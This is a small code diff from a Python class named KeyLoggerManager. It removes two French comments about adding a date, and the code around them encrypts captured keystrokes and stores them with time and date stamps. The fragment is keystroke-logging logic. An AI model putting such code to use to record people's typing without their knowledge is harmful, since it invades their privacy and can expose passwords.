@@ -41,12 +41,12 @@ class KeyLoggerManager:
 
         encrypted_data = self.encryptor.encrypt(logged_keys)
         timestamp = datetime.now().strftime("%H:%M:%S")
-        datestamp = datetime.now().strftime("%Y-%m-%d")  # Ajout de la date
+        datestamp = datetime.now().strftime("%Y-%m-%d")
 
         if encrypted_data:
             log_entry = {
                 "timestamp": timestamp,
-                "datestamp": datestamp,  # 🔹 Ajout de la date
+                "datestamp": datestamp,
                 "key_data": encrypted_data
             }
             self.entries_list.append(log_entry)
